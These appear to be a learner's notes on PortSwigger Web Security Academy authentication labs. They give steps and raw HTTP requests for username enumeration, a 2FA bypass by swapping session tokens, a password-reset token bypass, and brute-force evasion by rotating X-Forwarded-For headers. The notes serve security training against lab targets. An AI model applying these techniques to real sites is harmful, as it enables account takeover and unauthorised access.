# Authentication vulnerabilities

## Username enumeration via different responses

Use Intruder with username and pw as sniper targets

## 2FA simple bypass

1. Login as `wiener:peter`
1. Use portswigger e-mail to login with 2FA
1. capture e-mail change request into repeater
1. logout
1. login as `carlos:montoya`
1. copy session token from the new session
1. insert session token in the prev. captured request to change the e-mail
1. insert wrong code and login again as carlos
1. recieve 2FA code via e-mail
1. ???
1. Profit

##  Password reset broken logic

The `temp-forgot-password` parameter is not checked, so we can just send a
request in carlos' name

``` 
POST /forgot-password/?temp-forgot-password-token HTTP/2
Host: 0a3c00e903fa9e9980fe764f00c60058.web-security-academy.net
Cookie: session=ET1xcusj0lhDr3wWMSd1qCOcQLItAXnW
[...]

temp-forgot-password-token&username=carlos&new-password-1=bla&new-password-2=bla
```

## Username enumeration via response timing

- Login takes longer for valid users.
- there is a Brute force prevention in place.
  - `X-Forwarded-For:§1§` header can be used to evade this.

Use Intruder with Pitchfork:

- **Parameter 1 `X-Forwarded-For:§1§`**: Numbers 1-100
- **Parameter 2 `Username=§2§`**: Username list

We find that `ec2-user` is valid. Now we can do the same again with the PW list.

Final Payload:

```
POST /login HTTP/2
Host: 0a7e00bc04419db78499a2da00be0045.web-security-academy.net
Cookie: session=4MtRH2xLQGE0NrFKaQvHcOVy38p2Fdx0
X-Forwarded-For:§1§

username=ec2-user&password=§dadadaaaaaaaaaaaaaaaaaaaaaa1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111a
```


